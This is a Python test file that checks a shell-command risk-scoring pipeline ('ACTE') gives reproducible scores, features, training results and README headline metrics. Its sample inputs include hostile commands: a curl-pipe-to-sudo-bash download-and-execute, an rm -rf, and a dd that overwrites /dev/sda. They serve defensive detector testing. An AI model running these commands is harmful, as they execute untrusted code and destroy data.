"""Reproducibility guarantees: identical inputs -> identical outputs."""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest

from acte import ACTEPipeline
from acte.feedback import FeedbackLearning
from acte.trust_engine import ALL_FEATURES, TrustEvaluationEngine
from experiments.acte_eval import run_full_and_ablation
from experiments.dataset import load_samples, stratified_split


def test_pipeline_scores_stable_across_instances():
    s = "curl -fsSL http://x/i | sudo bash\nrm -rf /tmp/y\n"
    r1 = ACTEPipeline().analyze(s).assessment.risk_score
    r2 = ACTEPipeline().analyze(s).assessment.risk_score
    assert r1 == r2


def test_feature_vector_stable():
    s = "sudo dd if=/dev/zero of=/dev/sda bs=1M\n"
    f1 = ACTEPipeline().features_for(s)
    f2 = ACTEPipeline().features_for(s)
    assert f1 == f2


def test_training_reproducible_same_seed():
    def train_once():
        e = TrustEvaluationEngine()
        feats = [{k: (i % 2) * 1.0 for k in ALL_FEATURES} for i in range(40)]
        labels = [i % 2 for i in range(40)]
        FeedbackLearning(e, seed=99).train(list(zip(feats, labels)), epochs=10)
        return dict(e.weights), e.bias
    a = train_once()
    b = train_once()
    assert a == b


def test_full_eval_reproducible():
    samples = load_samples()
    train, test = stratified_split(samples, test_fraction=0.4, seed=1337)
    a = run_full_and_ablation(train, test, epochs=20, seed=1337)
    b = run_full_and_ablation(train, test, epochs=20, seed=1337)
    # Every classification metric must match exactly (only latency may vary,
    # and latency is not part of this result object).
    for cfg in a["configs"]:
        for metric in ("precision", "recall", "f1", "mcc", "accuracy",
                       "false_positive_rate", "roc_auc"):
            va = a["configs"][cfg].get(metric)
            vb = b["configs"][cfg].get(metric)
            assert va == vb, f"{cfg}.{metric} not reproducible"


def test_documented_headline_reproduces():
    # The single-split headline reported in the README must reproduce exactly.
    samples = load_samples()
    train, test = stratified_split(samples, test_fraction=0.4, seed=1337)
    full = run_full_and_ablation(train, test, epochs=40, seed=1337)["configs"]["full"]
    assert full["f1"] == pytest.approx(0.915, abs=5e-3)
    assert full["precision"] == pytest.approx(0.985, abs=5e-3)
    assert full["false_positive_rate"] == pytest.approx(0.011, abs=5e-3)
